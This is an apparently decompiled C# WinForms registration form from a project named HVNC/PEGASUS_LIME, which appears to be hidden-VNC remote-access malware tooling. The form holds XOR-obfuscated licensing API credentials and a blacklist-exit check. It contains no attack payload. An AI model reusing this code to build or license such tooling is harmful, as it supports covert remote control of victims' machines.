using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS_LIME.Design;
using PEGASUS_LIME.Properties;
using PEGASUS_LIME.Skoteinos_Pegasus;

namespace HVNC
{
	public class FrmRegister : Form
	{
		private IContainer components;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2GroupBox guna2GroupBox1;

		private Label label1;

		private Guna2TextBox license;

		private Guna2TextBox password;

		private Guna2TextBox username;

		private Guna2Button button2;

		private Guna2DragControl guna2DragControl1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2Button guna2Button1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private PictureBox pictureBox1;

		private static readonly string name = info("ZOMKUB");

		private static readonly string pegaid = info("a=Xl3GS?GY");

		private static readonly string pegmystic = info("?o:n8:>=h;2:n<k<hlkh<<i?>8ii:o98<;=:o989?noo?n?ih><:ok=khii<l?>3");

		private static readonly string version = "1.0";

		public static api Darkness = new api(name, pegaid, pegmystic, version);

		private static string info(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			foreach (uint num in array)
			{
				char value = (char)(num ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		public FrmRegister()
		{
			InitializeComponent();
		}

		private void bunifuButton1_Click(object sender, EventArgs e)
		{
			Hide();
			new Log().Show();
		}

		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
		{
		}

		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
			Hide();
			new Log().ShowDialog();
		}

		private void FrmRegister_FormClosing(object sender, FormClosingEventArgs e)
		{
			Application.Exit();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmRegister));
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			label1 = new System.Windows.Forms.Label();
			guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
			button2 = new Guna.UI2.WinForms.Guna2Button();
			license = new Guna.UI2.WinForms.Guna2TextBox();
			password = new Guna.UI2.WinForms.Guna2TextBox();
			username = new Guna.UI2.WinForms.Guna2TextBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2GroupBox1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(-1431, 55);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.Size = new System.Drawing.Size(41, 34);
			guna2ControlBox1.TabIndex = 10;
			label1.AutoSize = true;
			label1.BackColor = System.Drawing.Color.Transparent;
			label1.Font = new System.Drawing.Font("Electrolize", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.Gainsboro;
			label1.Location = new System.Drawing.Point(53, 71);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(106, 29);
			label1.TabIndex = 3;
			label1.Text = "Register";
			guna2GroupBox1.BackColor = System.Drawing.Color.Black;
			guna2GroupBox1.BorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.BorderThickness = 5;
			guna2GroupBox1.Controls.Add(pictureBox1);
			guna2GroupBox1.Controls.Add(guna2ControlBox2);
			guna2GroupBox1.Controls.Add(guna2Button1);
			guna2GroupBox1.Controls.Add(button2);
			guna2GroupBox1.Controls.Add(license);
			guna2GroupBox1.Controls.Add(label1);
			guna2GroupBox1.Controls.Add(password);
			guna2GroupBox1.Controls.Add(username);
			guna2GroupBox1.CustomBorderColor = System.Drawing.Color.Black;
			guna2GroupBox1.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GroupBox1.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox1.Location = new System.Drawing.Point(9, 13);
			guna2GroupBox1.Name = "guna2GroupBox1";
			guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
			guna2GroupBox1.Size = new System.Drawing.Size(214, 543);
			guna2GroupBox1.TabIndex = 0;
			guna2GroupBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2GroupBox1_MouseDown);
			pictureBox1.Image = PEGASUS_LIME.Properties.Resources.pegamatrix;
			pictureBox1.Location = new System.Drawing.Point(8, 106);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(198, 124);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 146;
			pictureBox1.TabStop = false;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = PEGASUS_LIME.Properties.Resources._1;
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(169, 7);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 123;
			guna2ControlBox2.UseTransparentBackground = true;
			guna2Button1.Animated = true;
			guna2Button1.BackColor = System.Drawing.Color.Transparent;
			guna2Button1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.BorderThickness = 1;
			guna2Button1.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2Button1.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2Button1.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.CheckedState.Parent = guna2Button1;
			guna2Button1.CustomImages.Parent = guna2Button1;
			guna2Button1.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button1.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2Button1.DisabledState.ForeColor = System.Drawing.Color.White;
			guna2Button1.DisabledState.Parent = guna2Button1;
			guna2Button1.FillColor = System.Drawing.Color.Black;
			guna2Button1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2Button1.ForeColor = System.Drawing.Color.White;
			guna2Button1.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button1.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button1.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.HoverState.Parent = guna2Button1;
			guna2Button1.Location = new System.Drawing.Point(8, 490);
			guna2Button1.Name = "guna2Button1";
			guna2Button1.ShadowDecoration.Parent = guna2Button1;
			guna2Button1.Size = new System.Drawing.Size(197, 37);
			guna2Button1.TabIndex = 6;
			guna2Button1.Text = "Back to login";
			guna2Button1.Click += new System.EventHandler(siticoneRoundedButton1_Click);
			button2.Animated = true;
			button2.BackColor = System.Drawing.Color.Transparent;
			button2.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			button2.BorderThickness = 1;
			button2.CheckedState.BorderColor = System.Drawing.Color.White;
			button2.CheckedState.FillColor = System.Drawing.Color.Black;
			button2.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			button2.CheckedState.Parent = button2;
			button2.CustomImages.Parent = button2;
			button2.DisabledState.BorderColor = System.Drawing.Color.White;
			button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			button2.DisabledState.FillColor = System.Drawing.Color.Black;
			button2.DisabledState.ForeColor = System.Drawing.Color.White;
			button2.DisabledState.Parent = button2;
			button2.FillColor = System.Drawing.Color.Black;
			button2.Font = new System.Drawing.Font("Electrolize", 9f);
			button2.ForeColor = System.Drawing.Color.White;
			button2.HoverState.BorderColor = System.Drawing.Color.White;
			button2.HoverState.FillColor = System.Drawing.Color.Black;
			button2.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			button2.HoverState.Parent = button2;
			button2.Location = new System.Drawing.Point(8, 436);
			button2.Name = "button2";
			button2.ShadowDecoration.Parent = button2;
			button2.Size = new System.Drawing.Size(197, 37);
			button2.TabIndex = 5;
			button2.Text = "Register";
			button2.Click += new System.EventHandler(siticoneRoundedButton2_Click);
			license.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			license.Cursor = System.Windows.Forms.Cursors.IBeam;
			license.DefaultText = "";
			license.DisabledState.BorderColor = System.Drawing.Color.White;
			license.DisabledState.FillColor = System.Drawing.Color.Black;
			license.DisabledState.ForeColor = System.Drawing.Color.White;
			license.DisabledState.Parent = license;
			license.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			license.FillColor = System.Drawing.Color.Black;
			license.FocusedState.BorderColor = System.Drawing.Color.White;
			license.FocusedState.FillColor = System.Drawing.Color.Black;
			license.FocusedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			license.FocusedState.Parent = license;
			license.Font = new System.Drawing.Font("Electrolize", 9f);
			license.HoverState.BorderColor = System.Drawing.Color.White;
			license.HoverState.FillColor = System.Drawing.Color.Black;
			license.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			license.HoverState.Parent = license;
			license.Location = new System.Drawing.Point(8, 372);
			license.Name = "license";
			license.PasswordChar = '\0';
			license.PlaceholderForeColor = System.Drawing.Color.Gainsboro;
			license.PlaceholderText = "License";
			license.SelectedText = "";
			license.ShadowDecoration.Parent = license;
			license.Size = new System.Drawing.Size(198, 37);
			license.TabIndex = 4;
			password.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			password.Cursor = System.Windows.Forms.Cursors.IBeam;
			password.DefaultText = "";
			password.DisabledState.BorderColor = System.Drawing.Color.White;
			password.DisabledState.FillColor = System.Drawing.Color.Black;
			password.DisabledState.ForeColor = System.Drawing.Color.White;
			password.DisabledState.Parent = password;
			password.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			password.FillColor = System.Drawing.Color.Black;
			password.FocusedState.BorderColor = System.Drawing.Color.White;
			password.FocusedState.FillColor = System.Drawing.Color.Black;
			password.FocusedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			password.FocusedState.Parent = password;
			password.Font = new System.Drawing.Font("Electrolize", 9f);
			password.HoverState.BorderColor = System.Drawing.Color.White;
			password.HoverState.FillColor = System.Drawing.Color.Black;
			password.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			password.HoverState.Parent = password;
			password.Location = new System.Drawing.Point(8, 328);
			password.Name = "password";
			password.PasswordChar = '\0';
			password.PlaceholderForeColor = System.Drawing.Color.Gainsboro;
			password.PlaceholderText = "Password";
			password.SelectedText = "";
			password.ShadowDecoration.Parent = password;
			password.Size = new System.Drawing.Size(198, 37);
			password.TabIndex = 2;
			username.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			username.Cursor = System.Windows.Forms.Cursors.IBeam;
			username.DefaultText = "";
			username.DisabledState.BorderColor = System.Drawing.Color.White;
			username.DisabledState.FillColor = System.Drawing.Color.Black;
			username.DisabledState.ForeColor = System.Drawing.Color.White;
			username.DisabledState.Parent = username;
			username.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			username.FillColor = System.Drawing.Color.Black;
			username.FocusedState.BorderColor = System.Drawing.Color.White;
			username.FocusedState.FillColor = System.Drawing.Color.Black;
			username.FocusedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			username.FocusedState.Parent = username;
			username.Font = new System.Drawing.Font("Electrolize", 9f);
			username.HoverState.BorderColor = System.Drawing.Color.White;
			username.HoverState.FillColor = System.Drawing.Color.Black;
			username.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			username.HoverState.Parent = username;
			username.Location = new System.Drawing.Point(8, 284);
			username.Name = "username";
			username.PasswordChar = '\0';
			username.PlaceholderForeColor = System.Drawing.Color.Gainsboro;
			username.PlaceholderText = "Username";
			username.SelectedText = "";
			username.ShadowDecoration.Parent = username;
			username.Size = new System.Drawing.Size(198, 37);
			username.TabIndex = 1;
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TargetControl = guna2GroupBox1;
			guna2DragControl1.UseTransparentDrag = true;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(232, 570);
			base.Controls.Add(guna2GroupBox1);
			base.Controls.Add(guna2ControlBox1);
			DoubleBuffered = true;
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmRegister";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Register";
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(FrmRegister_FormClosing);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FrmRegister_FormClosed);
			base.Load += new System.EventHandler(FrmRegister_Load);
			guna2GroupBox1.ResumeLayout(false);
			guna2GroupBox1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
		}

		private void FrmRegister_Load(object sender, EventArgs e)
		{
			Darkness.init();
			if (Darkness.checkblack())
			{
				Environment.Exit(0);
			}
			password.UseSystemPasswordChar = true;
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2GroupBox1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void FrmRegister_FormClosed(object sender, FormClosedEventArgs e)
		{
			Application.Exit();
		}
	}
}
